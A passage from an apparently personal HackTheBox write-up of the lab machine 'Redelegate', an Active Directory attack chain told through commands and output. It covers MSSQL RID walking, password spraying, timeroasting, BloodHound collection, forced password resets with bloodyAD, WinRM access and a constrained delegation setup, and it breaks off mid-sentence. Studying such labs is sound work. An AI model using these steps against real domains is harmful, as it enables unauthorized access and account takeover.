an MSSQL binary SID like this back into a WIndows SID:</p> <p><code>mssql_sid_to_windows_sid.py</code></p> <pre><code>#!/usr/bin/env python3\nimport struct, binascii\n\n\nprint(\"In MSSQL, use something like the following to get the hexstr SID representation of a 'USER', which is a Windows Domain account:\\n    select SUSER_SID('SIGNED\\\\mssqlsvc')\\n\")\n\n\ndef convert_binary_sid_to_string(binary_sid):\n    if not isinstance(binary_sid, bytes) or len(binary_sid) &lt; 8:\n        return None  # SID must be at least 8 bytes long\n\n    # Unpack the fixed parts of the SID\n    revision_level = struct.unpack('&lt;B', binary_sid[0:1])[0]\n    subauthority_count = struct.unpack('&lt;B', binary_sid[1:2])[0]\n    identifier_authority = struct.unpack('&gt;Q', b'\\x00\\x00' + binary_sid[2:8])[0] # Big-endian for identifier authority\n\n    sid_parts = [f\"S-{revision_level}\", str(identifier_authority)]\n\n    # Unpack the subauthorities\n    offset = 8\n    for _ in range(subauthority_count):\n        if offset + 4 &gt; len(binary_sid):\n            return None  # Incomplete SID\n        subauthority = struct.unpack('&lt;I', binary_sid[offset:offset+4])[0]\n        sid_parts.append(str(subauthority))\n        offset += 4\n\n    return \"-\".join(sid_parts)\n\n\nsid_binary = binascii.unhexlify(input(\"Give hexstr sid from mssql:&gt; \"))\nwindows_sid_string = convert_binary_sid_to_string(sid_binary)\nprint(f\"Binary SID: {sid_binary.hex()}\")\nprint(f\"Windows SID String: {windows_sid_string}\")\n</code></pre> <p>Convert the sid:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ ~/bin/mssql_sid_to_windows_sid.py\nSQL (SIGNED\\mssqlsvc  guest@master)&gt; select SUSER_SID('SIGNED\\mssqlsvc')\nIn MSSQL, use something like the following to get the hexstr SID representation of a 'USER', which is a Windows Domain account:\n    select SUSER_SID('SIGNED\\mssqlsvc')\n\nGive hexstr sid from mssql:&gt; 010500000000000515000000a185deefb22433798d8e847a5f040000\nBinary SID: 010500000000000515000000a185deefb22433798d8e847a5f040000\nWindows SID String: S-1-5-21-4024337825-2033394866-2055507597-1119\n</code></pre> <p>Now that's really interesting, because there are stored procedures for going the other way too.  The SID can be translated back into binary:</p> <pre><code>SQL (SQLGuest  guest@master)&gt; select SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1119')\n\n-----------------------------------------------------------   \nb'010500000000000515000000a185deefb22433798d8e847a5f040000'\n</code></pre> <p>Do the math, and we have everything we need to go full circle, starting with a Windows Domain format SID, and translate it to a domain account name:</p> <pre><code>SQL (SQLGuest  guest@master)&gt; select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1119')))\n\n------------------   \nREDELEGATE\\sql_svc\n</code></pre> <p>That's great, let's go ahead and generate a batch file to iterate through a range of RIDs.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ for item in {1000..1200}; do echo \"select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-$item')))\" | tee -a ridwalk.txt; done\nselect SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1000')))\nselect SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1001')))\nselect SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1002')))\nselect SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1003')))\nselect SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1004')))\n\n[...]\nselect SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1200')))\n</code></pre> <p>We can pass this file to <code>impacket-mssqlclient</code> to perform the ridwalk and grep out matches on domain.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-mssqlclient DC/sqlguest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file ridwalk.txt | grep REDELEGATE --text\nREDELEGATE\\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   \nREDELEGATE\\DC$   \nREDELEGATE\\FS01$   \nREDELEGATE\\Christine.Flanders   \nREDELEGATE\\Marie.Curie   \nREDELEGATE\\Helen.Frost   \nREDELEGATE\\Michael.Pontiac   \nREDELEGATE\\Mallory.Roberts   \nREDELEGATE\\James.Dinkleberg   \nREDELEGATE\\Helpdesk   \nREDELEGATE\\IT   \nREDELEGATE\\Finance   \nREDELEGATE\\DnsAdmins   \nREDELEGATE\\DnsUpdateProxy   \nREDELEGATE\\Ryan.Cooper   \nREDELEGATE\\sql_svc\n</code></pre> <p>And now we have our list of <code>domainprincipals.txt</code>.  Notably some of these are machines and groups</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ echo '''REDELEGATE\\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   \nREDELEGATE\\DC$   \nREDELEGATE\\FS01$   \nREDELEGATE\\Christine.Flanders   \nREDELEGATE\\Marie.Curie   \nREDELEGATE\\Helen.Frost   \nREDELEGATE\\Michael.Pontiac   \nREDELEGATE\\Mallory.Roberts   \nREDELEGATE\\James.Dinkleberg   \nREDELEGATE\\Helpdesk   \nREDELEGATE\\IT   \nREDELEGATE\\Finance   \nREDELEGATE\\DnsAdmins   \nREDELEGATE\\DnsUpdateProxy   \nREDELEGATE\\Ryan.Cooper   \nREDELEGATE\\sql_svc''' | sed -re 's/.+\\\\//g' | tee -a domainprincipals.txt\n</code></pre> <p>From that, we can go on to split the file out to <code>domainusers.txt</code>, <code>domaincomputers.txt</code>, and <code>domaingroups.txt</code></p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#finding-a-use-for-discovered-names","title":"Finding a use for discovered names","text":"<p>The <code>keepass</code> discovered passwords are worth a shot, but the list has to be cleaned of duplicates:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ cat passes.txt | sort -u &gt; passes2.txt\n</code></pre> <p>The other discovered passwords are <code>SeasonYear!</code>, <code>Fall2024!</code>, and who knows, maybe even <code>22331144</code>.   Those will also be added to <code>passes2.txt</code> </p> <p>Notable finds for <code>smb</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nxc smb dc.redelegate.vl -u domainusers.txt -p passes2.txt --continue-on-success\n\nSMB         10.129.234.50   445    DC               [-] redelegate.vl\\Mallory.Roberts:cn4KOEgsHqvKXPjEnSD9 STATUS_ACCOUNT_RESTRICTION\n</code></pre> <p>It was actually every password that <code>mallory.roberts</code> came back <code>STATUS_ACCOUNT_RESTRICTION</code>.</p> <p>This status could be for a few different reasons.  One of which is if the user has logon hours set.  Another is if the authentication method, such as <code>NTLM</code>, is not allowed. Policy restrictions can also be the cause:</p> <p>https://system32.eventsentry.com/codes/field/Netlogon%20Error%20Codes</p> <pre><code>0XC000006E\n    STATUS_ACCOUNT_RESTRICTION\nAccount restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced.\n</code></pre> <p>So far, these are the word lists I'm working with:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ timeout 1 tail -f passes2.txt domain*\n==&gt; passes2.txt &lt;==\ncn4KOEgsHqvKXPjEnSD9\ncVkqz4bCM7kJRSNlgx2G\nhMFS4I0Kj8Rcd62vqi5X\nSguPZBKdRyxWzvXRWy6U\nSpdv41gg4BlBgSYIW1gF\nzDPBpaF4FywlqIv11vii\nSeasonYear!\nFall2024!\n22331144\n\n==&gt; domaincomputers.txt &lt;==\nSQLServer2005SQLBrowserUser-Q13O908QBPG   \nDC$   \nFS01$   \n\n==&gt; domaingroups.txt &lt;==\nHelpdesk   \nIT   \nFinance   \nDnsAdmins   \nDnsUpdateProxy   \n\n==&gt; domainusers.txt &lt;==\nChristine.Flanders   \nMarie.Curie   \nHelen.Frost   \nMichael.Pontiac   \nMallory.Roberts   \nJames.Dinkleberg   \nRyan.Cooper   \nsql_svc\n</code></pre> <p>Try <code>ldap</code> with <code>Kerberos</code>.   Actually this time I got a hit:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ nxc ldap dc.redelegate.vl -u domainusers.txt -p passes2.txt -k\n[...]\nLDAP        dc.redelegate.vl 389    DC               [+] redelegate.vl\\Marie.Curie:Fall2024!\n</code></pre> <p>Get a ccache</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-getTGT redelegate.vl/marie.curie:Fall2024\\! -k\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in marie.curie.ccache\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#what-can-mariecurie-do","title":"What can marie.curie do","text":"<p>Nothing interesting going on in shares</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc smb dc.redelegate.vl -k --use-kcache --shares\n</code></pre> <p>Found a couple of hashes using the <code>NetExec</code> <code>timeroast</code> module</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc smb dc.redelegate.vl -k --use-kcache -M timeroast\nSMB         dc.redelegate.vl 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) \nSMB         dc.redelegate.vl 445    DC               [+] REDELEGATE.VL\\marie.curie from ccache \nTIMEROAST   dc.redelegate.vl 445    DC               [*] Starting Timeroasting...\nTIMEROAST   dc.redelegate.vl 445    DC               1002:$sntp-ms$1660abec3cf351eecbe5f4c46360cf17$1c0111e900000000000a75a34c4f434cecad7a3c9e75345fe1b8428bffbfcd0aecae1553428d7096ecae1553428de2ac\nTIMEROAST   dc.redelegate.vl 445    DC               1103:$sntp-ms$54856644229dc6ce6d6f7e1b92264d27$1c0111e900000000000a75a44c4f434cecad7a3ca13fe344e1b8428bffbfcd0aecae15546d47d805ecae15546d482f43\n</code></pre> <p>Try to crack them.  Nothing.  Of note, mode 31300 is only available in newer builds of <code>hashcat</code>.  Had to build from source to get that.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ hashcat --identify timeroast.hashes \nThe following hash-mode match the structure of your input hash:\n\n      # | Name                                                       | Category\n  ======+============================================================+======================================\n  31300 | MS SNTP                                                    | Network Protocol\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ sudo hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt --force --quiet\n[sudo] password for notroot: \n</code></pre> <p>Password policy analysis.  </p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc smb dc.redelegate.vl -k --use-kcache --pass-pol\nSMB         dc.redelegate.vl 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) \nSMB         dc.redelegate.vl 445    DC               [+] REDELEGATE.VL\\marie.curie from ccache \nSMB         dc.redelegate.vl 445    DC               [+] Dumping password info for domain: REDELEGATE\nSMB         dc.redelegate.vl 445    DC               Minimum password length: 7\nSMB         dc.redelegate.vl 445    DC               Password history length: 24\nSMB         dc.redelegate.vl 445    DC               Maximum password age: 41 days 23 hours 53 minutes \nSMB         dc.redelegate.vl 445    DC               \nSMB         dc.redelegate.vl 445    DC               Password Complexity Flags: 000001\nSMB         dc.redelegate.vl 445    DC                  Domain Refuse Password Change: 0\nSMB         dc.redelegate.vl 445    DC                  Domain Password Store Cleartext: 0\nSMB         dc.redelegate.vl 445    DC                  Domain Password Lockout Admins: 0\nSMB         dc.redelegate.vl 445    DC                  Domain Password No Clear Change: 0\nSMB         dc.redelegate.vl 445    DC                  Domain Password No Anon Change: 0\nSMB         dc.redelegate.vl 445    DC                  Domain Password Complex: 1\nSMB         dc.redelegate.vl 445    DC               \nSMB         dc.redelegate.vl 445    DC               Minimum password age: 1 day 4 minutes \nSMB         dc.redelegate.vl 445    DC               Reset Account Lockout Counter: 10 minutes \nSMB         dc.redelegate.vl 445    DC               Locked Account Duration: 10 minutes \nSMB         dc.redelegate.vl 445    DC               Account Lockout Threshold: None\nSMB         dc.redelegate.vl 445    DC               Forced Log off Time: Not Set\n</code></pre> <p>Machine Account Quota is set to zero, so low-privilege users creating a machine account is out of the question.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc ldap dc.redelegate.vl -k --use-kcache -M maq\nLDAP        dc.redelegate.vl 389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)\nLDAP        dc.redelegate.vl 389    DC               [+] redelegate.vl\\Marie.Curie from ccache \nMAQ         dc.redelegate.vl 389    DC               [*] Getting the MachineAccountQuota\nMAQ         dc.redelegate.vl 389    DC               MachineAccountQuota: 0\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#bloodhound-collection","title":"Bloodhound collection","text":"<p>Time to dig deeper, perform a <code>bloodound-ce-python</code> collection using the <code>bloodhound-ce</code> branch of https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce.  That way I can analyze in <code>Bloodhound Community Edition</code></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/marie.curie.ccache bloodhound-ce-python -k -no-pass -u marie.curie -d redelegate.vl -ns $(etchosts redelegate.vl) --dns-tcp --dns-timeout 10 --zip -op bloody -c all\nredelegate.vl == 10.129.234.50  ## `getent ahostsv4 $1 | awk '{print $1}' RS=eof &gt;&amp;1`\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: redelegate.vl\nINFO: Using TGT from cache\nINFO: Found TGT with correct principal in ccache file.\nINFO: Connecting to LDAP server: dc.redelegate.vl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: dc.redelegate.vl\nINFO: Found 12 users\nINFO: Found 56 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: \nINFO: Querying computer: dc.redelegate.vl\nWARNING: SID S-1-5-21-3745110700-3336928118-3915974013-1109 lookup failed, return status: STATUS_NONE_MAPPED\nINFO: Done in 00M 27S\nINFO: Compressing output into 20251030105643_bloodhound.zip\n</code></pre> <p>Before analyzing the <code>bloodhound</code> collection,  this piece seems to be worth investigating, to see what was missed.</p> <pre><code>WARNING: SID S-1-5-21-3745110700-3336928118-3915974013-1109 lookup failed, return status: STATUS_NONE_MAPPED\n</code></pre> <p>For that, I'll use <code>powerview.py</code>, which, IMO, is an awesome remote <code>powerview</code> platform that has grown on me.</p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#powerviewpy-analysis","title":"Powerview.py analysis","text":"<p>https://github.com/aniqfakhrul/powerview.py</p> <p>I tried a couple of different queries, nothing was returned:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/marie.curie.ccache powerview -k --no-pass --web --web-host 127.0.0.1 --web-port 8084 --web-auth shrek:mySwampD0nkee\\!th1si5 --no-cache --keepalive-interval 30 --obfuscate redelegate.vl/marie.curie@dc.redelegate.vl \n\nLogging directory is set to /home/notroot/.powerview/logs/redelegate-marie.curie-dc.redelegate.vl\n[2025-10-30 11:29:16] User marie.curie has adminCount attribute set to 1. Might be admin somewhere somehow :)\n[2025-10-30 11:29:16] Powerview web listening on 127.0.0.1:8084\n\n\u256d\u2500LDAP\u2500[dc.redelegate.vl]\u2500[REDELEGATE\\Marie.Curie]-[NS:&lt;auto&gt;] [WEB]\n\u2570\u2500PV \u276f history\n[2] ConvertFrom-SID -ObjectSID 'S-1-5-21-3745110700-3336928118-3915974013-1109'\n[1] Get-DomainObject -LDAPFilter '(&amp;(objectclass=*)(objectsid=S-1-5-21-3745110700-3336928118-3915974013-1109))'\n</code></pre> <p>If I analyze through the web interface, I noticed that RID 1109 does exist: </p> <p>However upon closer inspection, the SID doesn't match up: </p><pre><code>S-1-5-21-4024337825-2033394866-2055507597-1109  (James.Dinkleberg)\nS-1-5-21-3745110700-3336928118-3915974013-1109  (??? not even same domain)\n</code></pre><p></p> <p>Probably that is a SID from the machine-local domain (workgroup).</p> <p>However, I found my controlled user is a member of the <code>HelpDesk</code> group:</p> <p></p> <p>That gives me two separate SIDs to be on the lookout for, in DACLs:</p> <pre><code>\u256d\u2500LDAP\u2500[dc.redelegate.vl]\u2500[REDELEGATE\\Marie.Curie]-[NS:&lt;auto&gt;] [WEB]\n\u2570\u2500PV \u276f Get-DomainUser -Identity marie.curie -Properties cn,ObjectSid\ncn                         : Marie.Curie\nobjectSid                  : S-1-5-21-4024337825-2033394866-2055507597-1105\n\n\u256d\u2500LDAP\u2500[dc.redelegate.vl]\u2500[REDELEGATE\\Marie.Curie]-[NS:&lt;auto&gt;] [WEB]\n\u2570\u2500PV \u276f Get-DomainGroup -Identity HelpDesk -Properties cn,ObjectSid\ncn            : Helpdesk\nobjectSid     : S-1-5-21-4024337825-2033394866-2055507597-1112\n</code></pre> <p>One thing I did find that looks interesting is, when checking <code>Get-DomainObjectAcl</code>, I kept seeing the SID of the <code>HelpDesk</code> group pop up in the logging:</p> <pre><code>\u256d\u2500LDAP\u2500[dc.redelegate.vl]\u2500[REDELEGATE\\Marie.Curie]-[NS:&lt;auto&gt;] [WEB]\n\u2570\u2500PV \u276f Get-DomainObjectAcl -ResolveGUIDs -SearchBase \"cn=Users,dc=redelegate,dc=vl\"\n\n[2025-10-30 12:22:48] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while\n[2025-10-30 12:22:48] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:48] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:48] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519\n[2025-10-30 12:22:50] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:50] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-517\n[2025-10-30 12:22:51] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519\n[2025-10-30 12:22:51] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:52] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:53] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-517\n[2025-10-30 12:22:55] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519\n[2025-10-30 12:22:55] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-517\n[2025-10-30 12:22:57] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:58] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519\n[2025-10-30 12:22:58] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519\n[2025-10-30 12:22:59] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##&lt;--- here\n[2025-10-30 12:22:59] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519\n</code></pre> <p>That's when I saw <code>User-Force-Change-Password</code> a couple times associated to an SecurityIdentifier of the <code>HelpDesk</code> group.</p> <p>This led me to perform a more comprehensive and targeted search, where I found the <code>HelpDesk</code> group has <code>User-Force-Change-Password</code> over a number of objects</p> <pre><code>\u256d\u2500LDAP\u2500[dc.redelegate.vl]\u2500[REDELEGATE\\Marie.Curie]-[NS:&lt;auto&gt;] [WEB]\n\u2570\u2500PV \u276f Get-DomainObjectAcl -ResolveGUIDs -SearchBase \"cn=Users,dc=redelegate,dc=vl\" -Where \"SecurityIdentifier contains S-1-5-21-4024337825-2033394866-2055507597-1112\" -Where \"ObjectAceType contains Force-Change-Password\" -Select ObjectDn\n\nCN=SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG,CN=Users,DC=redelegate,DC=vl\nCN=Guest,CN=Users,DC=redelegate,DC=vl\nCN=DnsAdmins,CN=Users,DC=redelegate,DC=vl\nCN=Finance,CN=Users,DC=redelegate,DC=vl\nCN=IT,CN=Users,DC=redelegate,DC=vl\nCN=Helpdesk,CN=Users,DC=redelegate,DC=vl\nCN=Michael.Pontiac,CN=Users,DC=redelegate,DC=vl\nCN=Helen.Frost,CN=Users,DC=redelegate,DC=vl\nCN=Christine.Flanders,CN=Users,DC=redelegate,DC=vl\nCN=Protected Users,CN=Users,DC=redelegate,DC=vl\nCN=Cloneable Domain Controllers,CN=Users,DC=redelegate,DC=vl\nCN=Enterprise Read-only Domain Controllers,CN=Users,DC=redelegate,DC=vl\nCN=Denied RODC Password Replication Group,CN=Users,DC=redelegate,DC=vl\nCN=Allowed RODC Password Replication Group,CN=Users,DC=redelegate,DC=vl\nCN=RAS and IAS Servers,CN=Users,DC=redelegate,DC=vl\nCN=Group Policy Creator Owners,CN=Users,DC=redelegate,DC=vl\nCN=Domain Users,CN=Users,DC=redelegate,DC=vl\nCN=Cert Publishers,CN=Users,DC=redelegate,DC=vl\nCN=Users,DC=redelegate,DC=vl\n</code></pre> <p>At any rate, Bloodhound collection is worth investigating.</p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#bloodhound-analysis","title":"Bloodhound analysis","text":"<p>In fact, <code>marie.curie</code> has just that <code>ForceChangePassword</code> Outbound Object Control over a number of user accounts:</p> <p></p> <p>Another point of interest, but <code>Helen.Frost</code> is a member of <code>Remote Management Users</code> (which means WinRM), and also a member of <code>IT</code>, which has <code>GenericAll</code> over <code>FS01$</code>.  The following cipher query embodies both of those connections.</p> <pre><code>match p1=((u:User {name:\"HELEN.FROST@REDELEGATE.VL\"})-[r:MemberOf]-&gt;(g:Group)) \nmatch p2=((g2:Group {name:\"IT@REDELEGATE.VL\"})-[r2:GenericAll]-&gt;(c:Computer))\nWHERE (g.name = \"REMOTE MANAGEMENT USERS@REDELEGATE.VL\" or g.name = \"IT@REDELEGATE.VL\")\nreturn p1, p2\n</code></pre> <p></p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#take-control-of-helenfrost","title":"Take control of helen.frost","text":"<p>Change <code>helen.frost</code>'s password using <code>bloodyAD</code></p> <p>https://github.com/CravateRouge/bloodyAD</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ bloodyAD -d redelegate.vl -u marie.curie -k ccache=$(pwd)/marie.curie.ccache -H dc.redelegate.vl -t 10 set password helen.frost 'likelyHOT98!'\n[+] Password changed successfully!\n</code></pre> <p>Get a ccache</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-getTGT -k redelegate.vl/helen.frost:'likelyHOT98!' \nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in helen.frost.ccache\n</code></pre> <p>Using the credential cache of <code>helen.frost</code>, do a <code>WinRM</code> into the DC.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/helen.frost.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl\n\n[...]\n*Evil-WinRM* PS C:\\Users\\Helen.Frost\\Documents&gt; ls ..\\desktop\\\n\n\n    Directory: C:\\Users\\Helen.Frost\\desktop\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-ar---        10/29/2025  10:47 PM             34 user.txt\n</code></pre> <p>User flag: </p><pre><code>*Evil-WinRM* PS C:\\Users\\Helen.Frost\\Documents&gt; type ..\\desktop\\user.txt\n50fc3b5e9067a2070047abcf5a8dec45\n</code></pre><p></p> <p>So something interesting that I found almost immediately is that <code>helen.frost</code> has the <code>SeEnableDelegationPrivilege</code> , and its enabled:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Helen.Frost\\Documents&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                                                    State\n============================= ============================================================== =======\nSeMachineAccountPrivilege     Add workstations to domain                                     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled\nSeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled\n</code></pre> <p>Might have to circle back on this, first I want to take control of <code>FS01</code>.</p>"},{"location":"writeups/HackTheBox/Machines/Redelegate/#genericall-over-fs01","title":"GenericAll over FS01$","text":"<p>Take ownership of <code>FS01$</code>, <code>bloodyAD</code> can do this </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 set owner 'FS01$' helen.frost\n[+] Old owner S-1-5-21-4024337825-2033394866-2055507597-512 is now replaced by helen.frost on FS01$\n</code></pre><p></p> <p>Now I should be able to <code>ForceChangePassword</code> over <code>FS01$</code>.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 set password 'FS01$' 'FunnyStuff01!'\n[+] Password changed successfully!\n</code></pre> <p>Obtain a ccache</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-getTGT -k redelegate.vl/fs01\\$:FunnyStuff01\\!\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in fs01$.ccache\n</code></pre> <p>My controlled user <code>helen.frost</code> has that <code>SeEnableDelegationPrivilege</code>.  I also now own <code>fs01$</code>.  I can update the machines' <code>msDS-AllowedToDelegateTo</code> property, allowing it to delegate to the <code>CIFS/dc.redelegate.vl</code> SPN.  Then I can perform a classic Constrained Delegation through <code>FS01$</code>.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 set object 'fs01$' msDS-AllowedToDelegateTo -v \"CIFS/dc.redelegate.vl\"\n[+] fs01$'s msDS-AllowedToDelegateTo has been updated\n</code></pre> <p>The account must also have <code>TrustedToAuthForDelegation</code> flag in its <code>userAccountControl</code>.  So I'll add that as well:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 add uac 'fs01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION\n[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to fs01$'s userAccountControl\n</code></pre> <p>What I find is that performing Constrained Delegation, requesting a service ticket fails:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/fs01\\$.ccache impacket-getST -k -no-pass -spn \"ldap/dc.redelegate.vl\" redelegate.vl/fs01\\$ -impersonate Administrator -altservice \"cifs\"\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)\n[-] Probably SPN is not allowed to delegate by user fs01$ or initial TGT not forwardable\n</code></pre> <p>That is because the <code>Administrator</code> user account is marked with the <code>NOT_DELEGATED</code> flag in its <code>userAccountControl</code>, so its 